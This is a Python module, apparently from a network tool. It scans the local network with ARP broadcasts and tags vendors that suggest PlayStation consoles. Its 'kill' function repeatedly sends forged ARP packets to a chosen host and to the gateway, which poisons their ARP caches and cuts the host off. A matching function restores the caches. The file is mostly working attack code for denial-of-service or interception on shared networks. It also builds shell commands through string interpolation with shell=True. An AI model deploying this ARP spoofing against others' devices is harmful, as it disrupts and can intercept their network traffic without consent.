# Set 'scapy' logging level to 'ERROR' to minimize 'WARNING' verbose
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
import os

from ipaddress import IPv4Interface
from manuf import MacParser
from scapy.all import ARP, Ether, conf, getmacbyip, send, srp
from subprocess import check_output
from time import sleep

from .settings import Settings
from .utilities import threaded

class Network():
    """
    Network class to handle anything network related.
    """
    __killed = {}
    __mac_parser = MacParser()
    __vendor_tags = {
        'CloudNet': 'PS',
        'HonHaiPr': 'PS',
        'SonyInte': 'PS'
    }

    get = {}

    @classmethod
    def initialize(cls):
        """
        Get interface, gateway, and network hosts information.
        """
        cls.get_interface()
        cls.get_gateway()
        cls.get_hosts()

    @classmethod
    def cleanup(cls):
        """
        Reset spoofed hosts before termination.
        """
        if (cls.get_killed() > 0):
            cls.__killed.clear()
            print("Resetting spoofed hosts...")
            sleep(Settings.get['DELAY'])

    @classmethod
    def get_gateway(cls):
        """
        Get gateway information.
        Return dictionary.
        """
        gwc = conf.route.route('1.1.1.1')
        cls.get['gateway'] = {
            'ip': gwc[2],
            'mac': getmacbyip(gwc[2])
        }
        return cls.get['gateway']

    @classmethod
    def get_hosts(cls):
        """
        Get network hosts information via ARP requests.
        Return list of dictionaries.
        """
        print("Scanning network for hosts...")

        ans = srp(
            Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=f"{cls.get['interface']['ip_cidr']}"),
            timeout = 2,
            verbose = False
        )[0]

        cls.get['hosts'] = [ {
            'ip': h[1].psrc,
            'mac': h[1].hwsrc,
            'vendor': cls.__mac_parser.get_manuf(h[1].hwsrc),
            'vendor_long': cls.__mac_parser.get_manuf_long(h[1].hwsrc),
            'vendor_tagged': cls.tag_vendor(cls.__mac_parser.get_manuf(h[1].hwsrc))
        } for h in ans ]

        return cls.get['hosts']

    @classmethod
    def get_interface(cls):
        """
        Get network interface information.
        Return dictionary.
        """
        iface = conf.iface
        netmask = cls.get_netmask(iface.ip)
        cls.get['interface'] = {
            'name': iface.name,
            'mac': iface.mac,
            'ip': iface.ip,
            'netmask': netmask,
            'ip_cidr': IPv4Interface(f"{iface.ip}/{netmask}").with_prefixlen
        }
        return cls.get['interface']

    @classmethod
    def get_killed(cls):
        """
        Return amount of killed hosts.
        """
        return len(cls.__killed)

    @classmethod
    def get_netmask(cls, ip):
        """
        Get network interface netmask via 'subprocess'.
        Return netmask string.
        """
        if (os.name == 'nt'):
            output = check_output(f'powershell "ipconfig | Select-String -Pattern {ip} -Context 1"', shell=True).decode()
            netmask = output.split(' ')[-1].rstrip()
        else:
            output = check_output(f"ifconfig | grep {ip}", shell=True).decode()
            n = output.split(' ')[3].replace('0x', '')
            netmask = '.'.join(str(int(n[i:i+2], 16)) for i in range(0, len(n), 2))
        return netmask

    @classmethod
    @threaded
    def kill(cls, host_index):
        """
        Spoof given host by poisoning ARP cache repeatedly.
        This method runs in thread.
        """
        host = cls.get['hosts'][host_index]

        # Check if host already been killed
        if (host['mac'] in cls.__killed):
            print(f"'{host['mac']} - {host['vendor']}' is already killed")
            return
        cls.__killed[host['mac']] = True

        packets = {
            'gateway': ARP(
                psrc = host['ip'],
                pdst = cls.get['gateway']['ip'],
                hwdst = cls.get['gateway']['mac']
            ),
            'host': ARP(
                psrc = cls.get['gateway']['ip'],
                pdst = host['ip'],
                hwdst = host['mac']
            )
        }

        # Poison ARP cache
        print(f"'{host['mac']} - {host['vendor']}' is killed")
        while (host['mac'] in cls.__killed):
            if (not Settings.get['SAFE_MODE']):
                send(packets['host'], verbose=False)
                send(packets['gateway'], verbose=False)
                sleep(Settings.get['DELAY'])
        print(f"'{host['mac']} - {host['vendor']}' is un-killed")

    @classmethod
    def spoof(cls, host_index):
        """
        Spoof and un-spoof host with 'WAIT_DURATION' in settings.
        Take host index and fetch host dictionary to pass along.
        """
        cls.kill(int(host_index))
        sleep(Settings.get['WAIT_DURATION'])
        cls.unkill(int(host_index))

    @classmethod
    def tag_vendor(cls, vendor):
        """
        Tag matched vendor.
        Return extended name.
        """
        tagged = vendor
        if (vendor in cls.__vendor_tags):
            tagged = f"{vendor} ({cls.__vendor_tags[vendor]})"
        return tagged

    @classmethod
    @threaded
    def unkill(cls, host_index):
        """
        Un-spoof given host by stopping spoof thread.
        This method runs in thread.
        """
        host = cls.get['hosts'][host_index]

        del cls.__killed[host['mac']]

        packets = {
            'gateway': ARP(
                psrc = host['ip'],
                hwsrc = host['mac'],
                pdst = cls.get['gateway']['ip'],
                hwdst = cls.get['gateway']['mac']
            ),
            'host': ARP(
                psrc = cls.get['gateway']['ip'],
                hwsrc = cls.get['gateway']['mac'],
                pdst = host['ip'],
                hwdst = host['mac']
            )
        }

        # Reset packets to host and gateway
        if (not Settings.get['SAFE_MODE']):
            send(packets['host'], verbose=False)
            send(packets['gateway'], verbose=False)